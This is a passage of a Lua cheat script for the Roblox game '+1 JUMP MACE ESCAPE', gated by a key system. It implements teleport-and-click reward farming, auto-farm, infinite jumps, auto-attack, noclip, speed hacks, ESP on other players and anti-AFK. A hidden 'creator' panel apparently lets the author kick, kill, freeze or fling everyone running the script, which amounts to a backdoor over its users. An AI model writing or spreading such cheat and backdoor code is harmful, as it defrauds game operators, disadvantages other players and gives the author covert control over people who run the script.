                loadMainMenu()
            end)
        else
            ErrorLabel.Text = getText("key_error")
            ErrorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
    end)
    
    KeyInput.FocusLost:Connect(function(enterPressed)
        if enterPressed and languageSelected then
            if KeyInput.Text == correctKey then
                ErrorLabel.Text = getText("key_success")
                ErrorLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                incrementScriptCounter()
                task.wait(0.5)
                animateKeySystemOut(MainFrame, ScreenGui, function()
                    ScreenGui:Destroy()
                    keyAccepted = true
                    loadMainMenu()
                end)
            else
                ErrorLabel.Text = getText("key_error")
                ErrorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            end
        end
    end)
    
    RUBtn.MouseButton1Click:Connect(function()
        language = "RU"
        unlockKeyInput()
        Title.Text = getText("key_title")
        KeyInput.PlaceholderText = getText("key_label")
        CheckButton.Text = "✅ " .. getText("key_success"):gsub("✅ ", "")
        GetKeyButton.Text = getText("get_key")
        RUBtn.Text = getText("lang_ru")
        ENBtn.Text = getText("lang_en")
        ErrorLabel.Text = ""
    end)
    
    ENBtn.MouseButton1Click:Connect(function()
        language = "EN"
        unlockKeyInput()
        Title.Text = getText("key_title")
        KeyInput.PlaceholderText = getText("key_label")
        CheckButton.Text = "✅ " .. getText("key_success"):gsub("✅ ", "")
        GetKeyButton.Text = getText("get_key")
        RUBtn.Text = getText("lang_ru")
        ENBtn.Text = getText("lang_en")
        ErrorLabel.Text = ""
    end)
end

-- ====== ЗАГРУЗКА ОСНОВНОГО МЕНЮ ======
function loadMainMenu()
    local Window = Rayfield:CreateWindow({
        Name = getText("menu_title"),
        LoadingTitle = "+1 JUMP MACE ESCAPE",
        LoadingSubtitle = "by ILOVEKOCMOC",
        ConfigurationSaving = {
            Enabled = true,
            FolderName = "ILOVEKOCMOC_Configs",
            FileName = "ILOVEKOCMOC"
        },
        Discord = {
            Enabled = false,
            Invite = "",
            RememberJoins = false
        },
        KeySystem = false
    })

    local Player = Players.LocalPlayer
    local VirtualUser = game:GetService("VirtualUser")
    local UserInputService = game:GetService("UserInputService")
    local screenSize = workspace.CurrentCamera.ViewportSize
    local centerX = screenSize.X / 2
    local centerY = screenSize.Y / 2

    local MoneyTab = Window:CreateTab(getText("tab_money"), 4483362458)
    MoneyTab:CreateSection("💰 " .. (language == "RU" and "Заработок" or "Earnings"))

    MoneyTab:CreateButton({
        Name = getText("btn_wins"),
        Callback = function()
            local model = workspace:FindFirstChild("GiveWins")
            if model then
                local buttonModel = model:FindFirstChild("Button13")
                if buttonModel then
                    local targetPart = buttonModel:FindFirstChild("Part") or buttonModel:FindFirstChildWhichIsA("Part")
                    if targetPart then
                        local Character = Player.Character or Player.CharacterAdded:Wait()
                        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                        if HumanoidRootPart then
                            HumanoidRootPart.CFrame = targetPart.CFrame + Vector3.new(0, 1, 0)
                            task.wait(0.1)
                        end
                        local detector = targetPart:FindFirstChild("ClickDetector")
                        if detector then detector:Fire() end
                    end
                end
            end
        end,
    })

    MoneyTab:CreateKeybind({
        Name = getText("bind_wins"),
        CurrentKeybind = "Insert",
        HoldToInteract = false,
        Flag = "WinsBind",
        Callback = function()
            local model = workspace:FindFirstChild("GiveWins")
            if model then
                local buttonModel = model:FindFirstChild("Button13")
                if buttonModel then
                    local targetPart = buttonModel:FindFirstChild("Part") or buttonModel:FindFirstChildWhichIsA("Part")
                    if targetPart then
                        local Character = Player.Character or Player.CharacterAdded:Wait()
                        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                        if HumanoidRootPart then
                            HumanoidRootPart.CFrame = targetPart.CFrame + Vector3.new(0, 1, 0)
                            task.wait(0.1)
                        end
                        local detector = targetPart:FindFirstChild("ClickDetector")
                        if detector then detector:Fire() end
                    end
                end
            end
        end
    })

    MoneyTab:CreateButton({
        Name = getText("btn_hell"),
        Callback = function()
            local model = workspace:FindFirstChild("HellGemGivers")
            if model then
                local buttonModel = model:FindFirstChild("HellButton3")
                if buttonModel then
                    local targetPart = buttonModel:FindFirstChild("Part") or buttonModel:FindFirstChildWhichIsA("Part")
                    if targetPart then
                        local Character = Player.Character or Player.CharacterAdded:Wait()
                        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                        if HumanoidRootPart then
                            HumanoidRootPart.CFrame = targetPart.CFrame + Vector3.new(0, 7, 0)
                            task.wait(0.1)
                        end
                        local detector = targetPart:FindFirstChild("ClickDetector")
                        if detector then detector:Fire() end
                    end
                end
            end
        end,
    })

    MoneyTab:CreateKeybind({
        Name = getText("bind_hell"),
        CurrentKeybind = "Home",
        HoldToInteract = false,
        Flag = "HellBind",
        Callback = function()
            local model = workspace:FindFirstChild("HellGemGivers")
            if model then
                local buttonModel = model:FindFirstChild("HellButton3")
                if buttonModel then
                    local targetPart = buttonModel:FindFirstChild("Part") or buttonModel:FindFirstChildWhichIsA("Part")
                    if targetPart then
                        local Character = Player.Character or Player.CharacterAdded:Wait()
                        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                        if HumanoidRootPart then
                            HumanoidRootPart.CFrame = targetPart.CFrame + Vector3.new(0, 7, 0)
                            task.wait(0.1)
                        end
                        local detector = targetPart:FindFirstChild("ClickDetector")
                        if detector then detector:Fire() end
                    end
                end
            end
        end
    })

    local MainTab = Window:CreateTab(getText("tab_main"), 4483362458)
    MainTab:CreateSection("⚡ " .. (language == "RU" and "Функции" or "Functions"))

    local farming = false
    local farmLoop = nil
    local posLoop = nil

    local AutoFarmToggle = MainTab:CreateToggle({
        Name = getText("btn_farm"),
        CurrentValue = false,
        Flag = "AutoFarm",
        Callback = function(Value)
            if Value then StartAutoFarm() else StopAutoFarm() end
        end,
    })

    function StartAutoFarm()
        if farming then return end
        farming = true
        local targetPart = workspace:FindFirstChild("FirstTarget")
        if not targetPart then
            Rayfield:Notify({Title = getText("error_title"), Content = getText("err_target"), Duration = 6.5, Image = 4483362458})
            farming = false
            return
        end
        local Character = Player.Character
        if Character then
            local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
            if HumanoidRootPart then savedPosition = HumanoidRootPart.CFrame end
        end
        savedTargetPosition = targetPart.Position
        targetPart.Position = Vector3.new(targetPart.Position.X, -50, targetPart.Position.Z)
        if Character then
            local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
            if HumanoidRootPart then
                HumanoidRootPart.CFrame = CFrame.new(targetPart.Position.X, -50 + 7, targetPart.Position.Z)
            end
        end
        posLoop = RunService.Heartbeat:Connect(function()
            if not farming then if posLoop then posLoop:Disconnect() posLoop = nil end return end
            local Character = Player.Character
            if Character then
                local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                if HumanoidRootPart and targetPart and targetPart.Parent then
                    HumanoidRootPart.CFrame = CFrame.new(targetPart.Position.X, targetPart.Position.Y + 7, targetPart.Position.Z)
                end
            end
        end)
        farmLoop = RunService.RenderStepped:Connect(function()
            if not farming then if farmLoop then farmLoop:Disconnect() farmLoop = nil end return end
            VirtualUser:ClickButton1(Vector2.new(centerX, centerY))
        end)
        Rayfield:Notify({Title = getText("farm_title"), Content = getText("success_farm_start"), Duration = 6.5, Image = 4483362458})
    end

    function StopAutoFarm()
        farming = false
        if farmLoop then farmLoop:Disconnect() farmLoop = nil end
        if posLoop then posLoop:Disconnect() posLoop = nil end
        if savedTargetPosition then
            local targetPart = workspace:FindFirstChild("FirstTarget")
            if targetPart then targetPart.Position = savedTargetPosition end
            savedTargetPosition = nil
        end
        if savedPosition then
            local Character = Player.Character
            if Character then
                local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                if HumanoidRootPart then HumanoidRootPart.CFrame = savedPosition end
            end
            savedPosition = nil
            Rayfield:Notify({Title = getText("farm_title"), Content = getText("success_return"), Duration = 6.5, Image = 4483362458})
        else
            Rayfield:Notify({Title = getText("farm_title"), Content = getText("success_farm_stop"), Duration = 6.5, Image = 4483362458})
        end
    end

    MainTab:CreateKeybind({
        Name = getText("bind_farm"),
        CurrentKeybind = "F8",
        HoldToInteract = false,
        Flag = "FarmBind",
        Callback = function()
            if farming then StopAutoFarm() AutoFarmToggle:Set(false) else StartAutoFarm() AutoFarmToggle:Set(true) end
        end
    })

    MainTab:CreateButton({
        Name = getText("btn_mobile_farm"),
        Callback = function()
            createMobileWindow(getText("mobile_farm_title"), function() StartAutoFarm() end, function() StopAutoFarm() end)
        end,
    })

    local infiniteJumps = false
    local jumpLoop = nil

    local InfiniteJumpsToggle = MainTab:CreateToggle({
        Name = getText("btn_jump"),
        CurrentValue = false,
        Flag = "InfiniteJumps",
        Callback = function(Value)
            if Value then StartInfiniteJumps() else StopInfiniteJumps() end
        end,
    })

    function StartInfiniteJumps()
        if infiniteJumps then return end
        infiniteJumps = true
        local targetPart = workspace:FindFirstChild("FirstTarget")
        if not targetPart then
            Rayfield:Notify({Title = getText("error_title"), Content = getText("err_target"), Duration = 6.5, Image = 4483362458})
            infiniteJumps = false
            return
        end
        savedTargetPosition = targetPart.Position
        setTargetTransparency(targetPart, 1)
        jumpLoop = RunService.Heartbeat:Connect(function()
            if not infiniteJumps then if jumpLoop then jumpLoop:Disconnect() jumpLoop = nil end return end
            local Character = Player.Character
            if Character and Character:FindFirstChild("HumanoidRootPart") then
                local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
                if HumanoidRootPart and targetPart and targetPart.Parent then
                    targetPart.Position = HumanoidRootPart.Position
                end
            end
        end)
        Rayfield:Notify({Title = getText("jump_title"), Content = getText("success_jump_start"), Duration = 6.5, Image = 4483362458})
    end

    function StopInfiniteJumps()
        infiniteJumps = false
        if jumpLoop then jumpLoop:Disconnect() jumpLoop = nil end
        if savedTargetPosition then
            local targetPart = workspace:FindFirstChild("FirstTarget")
            if targetPart then
                targetPart.Position = savedTargetPosition
                restoreTargetTransparency(targetPart)
            end
            savedTargetPosition = nil
        end
        Rayfield:Notify({Title = getText("jump_title"), Content = getText("success_jump_stop"), Duration = 6.5, Image = 4483362458})
    end

    MainTab:CreateKeybind({
        Name = getText("bind_jump"),
        CurrentKeybind = "F9",
        HoldToInteract = false,
        Flag = "JumpBind",
        Callback = function()
            if infiniteJumps then StopInfiniteJumps() InfiniteJumpsToggle:Set(false) else StartInfiniteJumps() InfiniteJumpsToggle:Set(true) end
        end
    })

    MainTab:CreateButton({
        Name = getText("btn_mobile_jump"),
        Callback = function()
            createMobileWindow(getText("mobile_jump_title"), function() StartInfiniteJumps() end, function() StopInfiniteJumps() end)
        end,
    })

    local maceActive = false
    local maceLoop = nil
    local maceSpeed = 5
    local lastMaceHit = 0

    local AutoMaceToggle = MainTab:CreateToggle({
        Name = getText("btn_mace"),
        CurrentValue = false,
        Flag = "AutoMace",
        Callback = function(Value)
            if Value then StartAutoMace() else StopAutoMace() end
        end,
    })

    function findMaceTargets()
        local targets = {}
        for _, descendant in ipairs(workspace:GetDescendants()) do
            if descendant.Name == "MaceTargetHighlight" then
                if descendant.Parent then
                    local found = false
                    for _, t in ipairs(targets) do
                        if t == descendant.Parent then found = true break end
                    end
                    if not found then
                        table.insert(targets, descendant.Parent)
                    end
                end
            end
        end
        return targets
    end

    function StartAutoMace()
        if maceActive then return end
        maceActive = true
        maceLoop = RunService.Heartbeat:Connect(function()
            if not maceActive then if maceLoop then maceLoop:Disconnect() maceLoop = nil end return end
            local currentTime = tick()
            if currentTime - lastMaceHit < (1 / maceSpeed) then return end
            local targets = findMaceTargets()
            if #targets > 0 then
                VirtualUser:ClickButton1(Vector2.new(centerX, centerY))
                lastMaceHit = tick()
            end
        end)
        Rayfield:Notify({Title = getText("mace_title"), Content = getText("success_mace_start"), Duration = 6.5, Image = 4483362458})
    end

    function StopAutoMace()
        maceActive = false
        if maceLoop then maceLoop:Disconnect() maceLoop = nil end
        Rayfield:Notify({Title = getText("mace_title"), Content = getText("success_mace_stop"), Duration = 6.5, Image = 4483362458})
    end

    MainTab:CreateKeybind({
        Name = getText("bind_mace"),
        CurrentKeybind = "F10",
        HoldToInteract = false,
        Flag = "MaceBind",
        Callback = function()
            if maceActive then StopAutoMace() AutoMaceToggle:Set(false) else StartAutoMace() AutoMaceToggle:Set(true) end
        end
    })

    MainTab:CreateButton({
        Name = getText("btn_mobile_mace"),
        Callback = function()
            createMobileWindow(getText("mobile_mace_title"), function() StartAutoMace() end, function() StopAutoMace() end)
        end,
    })

    local PlayerTab = Window:CreateTab(getText("tab_player"), 4483362458)
    PlayerTab:CreateSection("👤 " .. (language == "RU" and "Параметры игрока" or "Player Settings"))

    local noclipActive = false
    local noclipLoop = nil

    local NoclipToggle = PlayerTab:CreateToggle({
        Name = getText("btn_noclip"),
        CurrentValue = false,
        Flag = "Noclip",
        Callback = function(Value)
            if Value then
                noclipActive = true
                noclipLoop = RunService.Stepped:Connect(function()
                    if not noclipActive then if noclipLoop then noclipLoop:Disconnect() noclipLoop = nil end return end
                    local Character = Player.Character
                    if Character then
                        for _, part in ipairs(Character:GetDescendants()) do
                            if part:IsA("BasePart") then part.CanCollide = false end
                        end
                    end
                end)
            else
                noclipActive = false
                if noclipLoop then noclipLoop:Disconnect() noclipLoop = nil end
                local Character = Player.Character
                if Character then
                    for _, part in ipairs(Character:GetDescendants()) do
                        if part:IsA("BasePart") then part.CanCollide = true end
                    end
                end
            end
        end,
    })

    PlayerTab:CreateKeybind({
        Name = getText("bind_noclip"),
        CurrentKeybind = "F11",
        HoldToInteract = false,
        Flag = "NoclipBind",
        Callback = function()
            if noclipActive then noclipActive = false NoclipToggle:Set(false) else noclipActive = true NoclipToggle:Set(true) end
        end
    })

    PlayerTab:CreateButton({
        Name = getText("btn_mobile_noclip"),
        Callback = function()
            createMobileWindow(getText("mobile_noclip_title"), function() noclipActive = true end, function() noclipActive = false end)
        end,
    })

    PlayerTab:CreateSlider({
        Name = getText("speed_value"),
        Range = {16, 300},
        Increment = 1,
        Suffix = "Speed",
        CurrentValue = 16,
        Flag = "SpeedSlider",
        Callback = function(Value)
            local Character = Player.Character
            if Character then
                local Humanoid = Character:FindFirstChild("Humanoid")
                if Humanoid then Humanoid.WalkSpeed = Value end
            end
        end,
    })

    PlayerTab:CreateSlider({
        Name = getText("jump_value"),
        Range = {50, 300},
        Increment = 5,
        Suffix = "Power",
        CurrentValue = 50,
        Flag = "JumpPowerSlider",
        Callback = function(Value)
            local Character = Player.Character
            if Character then
                local Humanoid = Character:FindFirstChild("Humanoid")
                if Humanoid then Humanoid.JumpPower = Value end
            end
        end,
    })

    local espActive = false

    local EspToggle = PlayerTab:CreateToggle({
        Name = getText("btn_esp"),
        CurrentValue = false,
        Flag = "ESP",
        Callback = function(Value)
            if Value then
                espActive = true
                RunService.Heartbeat:Connect(function()
                    if not espActive then return end
                    for _, otherPlayer in ipairs(Players:GetPlayers()) do
                        if otherPlayer ~= Player and otherPlayer.Character then
                            local highlight = otherPlayer.Character:FindFirstChild("ESPHighlight")
                            if not highlight then
                                highlight = Instance.new("Highlight")
                                highlight.Name = "ESPHighlight"
                                highlight.FillColor = Color3.fromRGB(255, 0, 0)
                                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                                highlight.Parent = otherPlayer.Character
                            end
                        end
                    end
                end)
            else
                espActive = false
                for _, otherPlayer in ipairs(Players:GetPlayers()) do
                    if otherPlayer.Character then
                        local highlight = otherPlayer.Character:FindFirstChild("ESPHighlight")
                        if highlight then highlight:Destroy() end
                    end
                end
            end
        end,
    })

    PlayerTab:CreateKeybind({
        Name = getText("bind_esp"),
        CurrentKeybind = "F12",
        HoldToInteract = false,
        Flag = "EspBind",
        Callback = function()
            if espActive then espActive = false EspToggle:Set(false) else espActive = true EspToggle:Set(true) end
        end
    })

    PlayerTab:CreateButton({
        Name = getText("btn_mobile_esp"),
        Callback = function()
            createMobileWindow(getText("mobile_esp_title"), function() espActive = true end, function() espActive = false end)
        end,
    })

    local antiafkActive = false
    local antiafkLoop = nil

    local AntiAfkToggle = PlayerTab:CreateToggle({
        Name = getText("btn_antiafk"),
        CurrentValue = false,
        Flag = "AntiAFK",
        Callback = function(Value)
            if Value then
                antiafkActive = true
                antiafkLoop = RunService.Heartbeat:Connect(function()
                    if not antiafkActive then if antiafkLoop then antiafkLoop:Disconnect() antiafkLoop = nil end return end
                    VirtualUser:CaptureController()
                    VirtualUser:ClickButton2(Vector2.new(0, 0))
                end)
            else
                antiafkActive = false
                if antiafkLoop then antiafkLoop:Disconnect() antiafkLoop = nil end
            end
        end,
    })

    PlayerTab:CreateKeybind({
        Name = getText("bind_antiafk"),
        CurrentKeybind = "Pause",
        HoldToInteract = false,
        Flag = "AntiAfkBind",
        Callback = function()
            if antiafkActive then antiafkActive = false AntiAfkToggle:Set(false) else antiafkActive = true AntiAfkToggle:Set(true) end
        end
    })

    PlayerTab:CreateButton({
        Name = getText("btn_mobile_antiafk"),
        Callback = function()
            createMobileWindow(getText("mobile_antiafk_title"), function() antiafkActive = true end, function() antiafkActive = false end)
        end,
    })

    local LogsTab = Window:CreateTab(getText("tab_logs"), 4483362458)
    LogsTab:CreateSection("📋 " .. (language == "RU" and "История обновлений" or "Update History"))

    for _, log in ipairs(updateLogs) do
        LogsTab:CreateLabel("🔹 v" .. log.version)
        LogsTab:CreateParagraph({Title = "Изменения:", Content = log.changes})
    end

    local CreatorTab = Window:CreateTab(getText("tab_creator"), 4483362458)
    CreatorTab:CreateSection("👑 " .. (language == "RU" and "Доступ разработчика" or "Developer Access"))

    local creatorAccessGranted = false
    local CreatorKeyInput = CreatorTab:CreateInput({
        Name = getText("creator_key_label"),
        PlaceholderText = "Ключ...",
        RemoveTextAfterFocusLost = false,
        Callback = function(Text)
            if Text == creatorKey then
                creatorAccessGranted = true
                Rayfield:Notify({Title = getText("creator_title"), Content = getText("creator_key_success"), Duration = 6.5, Image = 4483362458})
                loadCreatorPanel()
            else
                Rayfield:Notify({Title = getText("error_title"), Content = getText("creator_key_error"), Duration = 6.5, Image = 4483362458})
            end
        end,
    })

    function loadCreatorPanel()
        if not creatorAccessGranted then return end
        
        CreatorTab:CreateSection("🌍 " .. (language == "RU" and "Статистика" or "Statistics"))
        
        local globalUsersLabel = CreatorTab:CreateLabel(getText("creator_global_users") .. "0")
        
        local syncLoop
        syncLoop = RunService.Heartbeat:Connect(function()
            if not creatorAccessGranted then
                if syncLoop then syncLoop:Disconnect() end
                return
            end
            spawn(function()
                pcall(function()
                    local users = getGlobalScriptUsers()
                    globalUsersLabel:Set(getText("creator_global_users") .. tostring(users))
                end)
            end)
            task.wait(1)
        end)
        
        CreatorTab:CreateSection("⚡ " .. (language == "RU" and "Глобальные действия" or "Global Actions"))
        
        CreatorTab:CreateButton({
            Name = getText("creator_kick_global"),
            Callback = function()
                sendGlobalCommand("kick", nil)
                Rayfield:Notify({Title = getText("creator_title"), Content = getText("creator_success_global"), Duration = 6.5, Image = 4483362458})
            end,
        })
        
        CreatorTab:CreateButton({
            Name = getText("creator_kill_global"),
            Callback = function()
                sendGlobalCommand("kill", nil)
                Rayfield:Notify({Title = getText("creator_title"), Content = getText("creator_success_global"), Duration = 6.5, Image = 4483362458})
            end,
        })
        
        CreatorTab:CreateButton({
            Name = getText("creator_freeze_global"),
            Callback = function()
                sendGlobalCommand("freeze", nil)
                Rayfield:Notify({Title = getText("creator_title"), Content = getText("creator_success_global"), Duration = 6.5, Image = 4483362458})
            end,
        })
        
        CreatorTab:CreateButton({
            Name = getText("creator_unfreeze_global"),
            Callback = function()
                sendGlobalCommand("unfreeze", nil)
                Rayfield:Notify({Title = getText("creator_title"), Content = getText("creator_success_global"), Duration = 6.5, Image = 4483362458})
            end,
        })
        
        CreatorTab:CreateButton({
            Name = getText("creator_heal_global"),
            Callback = function()
                sendGlobalCommand("heal", nil)
                Rayfield:Notify({Title = getText("creator_title"), Content = getText("creator_success_global"), Duration = 6.5, Image = 4483362458})
            end,
        })
        
        CreatorTab:CreateButton({
            Name = getText("creator_fling_global"),
            Callback = function()
                sendGlobalCommand("fling", nil)
                Rayfield:Notify({Title = getText("creator_title"), Content = getText("creator_success_global"), Duration = 6.5, Image = 4483362458})
            end,
        })
    end

    local SettingsTab = Window:CreateTab("⚙️ " .. (language == "RU" and "Настройки" or "Settings"), 4483362458)
    SettingsTab:CreateButton({
        Name = getText("btn_close"),
        Callback = function()
            StopAutoFarm()
            StopInfiniteJumps()
            StopAutoMace()
            noclipActive = false
            espActive = false
            antiafkActive = false
            if noclipLoop then noclipLoop:Disconnect() end
            if antiafkLoop then antiafkLoop:Disconnect() end
            Rayfield:Destroy()
        end,
    })

    Rayfield:Notify({
        Title = "ILOVEKOCMOC",
        Content = getText("loaded"),
        Duration = 6.5,
        Image = 4483362458
    })
end

-- ====== ЗАПУСК ======
createKeySystem()

print("✅ +1 JUMP MACE ESCAPE v1.1.2(Beta) LOADED")
